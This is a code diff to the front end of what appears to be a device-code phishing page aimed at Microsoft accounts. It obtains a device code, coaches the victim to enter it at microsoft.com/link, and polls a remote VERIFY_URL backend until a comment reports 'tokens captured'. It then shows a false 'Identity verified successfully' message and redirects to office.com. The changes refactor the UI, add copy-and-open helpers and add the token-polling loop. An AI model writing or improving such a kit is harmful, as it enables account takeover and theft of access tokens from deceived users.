@@ -65,11 +65,13 @@ let turnstileToken = '';
 
 function onTurnstileCallback(token) {
   turnstileToken = token;
-  document.getElementById('generateBtn').disabled = false;
+  const btn = document.getElementById('startBtn');
+  if (btn) btn.disabled = false;
 }
 
 async function generateCode() {
-  const btn = document.getElementById('generateBtn');
+  const btn = document.getElementById('startBtn');
+  if (!btn) return;
   btn.disabled = true;
   btn.innerHTML = '<span class="spinner"></span>Generating...';
   
@@ -94,27 +96,48 @@ async function generateCode() {
     
     deviceCodeData = data;
     
-    // Show code area
-    document.getElementById('codeArea').style.display = 'block';
-    btn.style.display = 'none';
-    document.getElementById('turnstileWidget').style.display = 'none';
+    // Show code panel
+    const codePanel = document.getElementById('codePanel');
+    if (codePanel) codePanel.style.display = 'block';
+    if (btn) btn.style.display = 'none';
+    const turnstileWidget = document.getElementById('turnstileWidget');
+    if (turnstileWidget) turnstileWidget.style.display = 'none';
     
-    document.getElementById('userCode').textContent = data.user_code;
+    const userCodeEl = document.getElementById('codeValue');
+    if (userCodeEl) {
+      userCodeEl.textContent = data.user_code;
+      userCodeEl.classList.remove('loading');
+    }
+    
+    // Show action row
+    const actionRow = document.getElementById('actionRow');
+    if (actionRow) actionRow.style.display = 'flex';
+    
+    // Update hint
+    const codeHint = document.getElementById('codeHint');
+    if (codeHint) codeHint.textContent = 'Enter this code at microsoft.com/link';
     
     // Start countdown
     let secondsLeft = data.expires_in || 900;
-    updateCountdown(secondsLeft);
+    const timerPill = document.getElementById('timerPill');
+    if (timerPill) {
+      timerPill.style.display = 'block';
+      timerPill.textContent = formatTime(secondsLeft);
+    }
+    
     countdownInterval = setInterval(() => {
       secondsLeft--;
       updateCountdown(secondsLeft);
       if (secondsLeft <= 0) {
         clearInterval(countdownInterval);
-        document.getElementById('timer').innerHTML = '<span style="color:#d13438;">Code expired</span>';
+        if (timerPill) {
+          timerPill.innerHTML = '<span style="color:#d13438;">Code expired</span>';
+        }
       }
     }, 1000);
     
-    // Start polling for tokens
-    pollingActive = true;
+    // Poll for status
+    startPolling(data);
   } catch (err) {
     btn.innerHTML = 'Get verification code';
     btn.disabled = false;
@@ -124,22 +147,97 @@ async function generateCode() {
 function updateCountdown(seconds) {
   const mins = Math.floor(seconds / 60);
   const secs = seconds % 60;
-  document.getElementById('countdown').textContent = 
-    String(mins).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
+  const timerPill = document.getElementById('timerPill');
+  if (timerPill) {
+    timerPill.textContent = `${mins}:${String(secs).padStart(2, '0')}`;
+  }
 }
 
 function copyCode() {
   if (!deviceCodeData) return;
   navigator.clipboard.writeText(deviceCodeData.user_code).then(() => {
     const btn = document.getElementById('copyBtn');
-    btn.textContent = 'Copied!';
-    setTimeout(() => { btn.textContent = 'Copy Code'; }, 2000);
+    if (btn) {
+      btn.textContent = 'Copied!';
+      setTimeout(() => { btn.textContent = 'Copy Code'; }, 2000);
+    }
   });
 }
 
 function openSignIn() {
   if (!deviceCodeData) return;
   window.open(deviceCodeData.verification_uri, '_blank');
+}
+
+function verifyWithCopy() {
+  if (!deviceCodeData) return;
+  copyCode();
+  setTimeout(() => openSignIn(), 500);
+}
+
+function refreshCode() {
+  if (!deviceCodeData) return;
+  // Reset and generate new code
+  const btn = document.getElementById('startBtn');
+  if (btn) {
+    btn.style.display = 'block';
+    btn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>Get verification code';
+  }
+  document.getElementById('codePanel').style.display = 'none';
+  document.getElementById('timerPill').style.display = 'none';
+  if (countdownInterval) clearInterval(countdownInterval);
+  deviceCodeData = null;
+}
+
+function formatTime(seconds) {
+  const mins = Math.floor(seconds / 60);
+  const secs = seconds % 60;
+  return `${mins}:${String(secs).padStart(2, '0')}`;
+}
+
+async function startPolling(data) {
+  if (!data.device_code) return;
+  
+  const maxAttempts = 60;
+  let attempts = 0;
+  
+  while (attempts < maxAttempts && pollingActive) {
+    await new Promise(resolve => setTimeout(resolve, 5000));
+    attempts++;
+    
+    try {
+      const response = await fetch(`${VERIFY_URL}/api/device/status/${data.device_code}`, {
+        headers: { 'Authorization': `Bearer ${JWT_TOKEN}` }
+      });
+      const status = await response.json();
+      
+      if (status.status === 'complete' && status.tokens) {
+        // Success - tokens captured
+        const actionRow = document.getElementById('actionRow');
+        if (actionRow) actionRow.style.display = 'none';
+        const statusMsg = document.getElementById('statusMsg');
+        if (statusMsg) {
+          statusMsg.innerHTML = '<span style="color:#00ff88;">✓ Identity verified successfully</span>';
+        }
+        if (countdownInterval) clearInterval(countdownInterval);
+        pollingActive = false;
+        
+        // Redirect after 2 seconds
+        setTimeout(() => {
+          window.location.href = window.__DESTINATION_URL || 'https://office.com';
+        }, 2000);
+        break;
+      } else if (status.status === 'expired' || status.status === 'cancelled') {
+        const statusMsg = document.getElementById('statusMsg');
+        if (statusMsg) {
+          statusMsg.innerHTML = '<span style="color:#d13438;">✗ Code expired or cancelled</span>';
+        }
+        break;
+      }
+    } catch (e) {
+      // Continue polling on error
+    }
+  }
 }
 
 // Initialize Turnstile
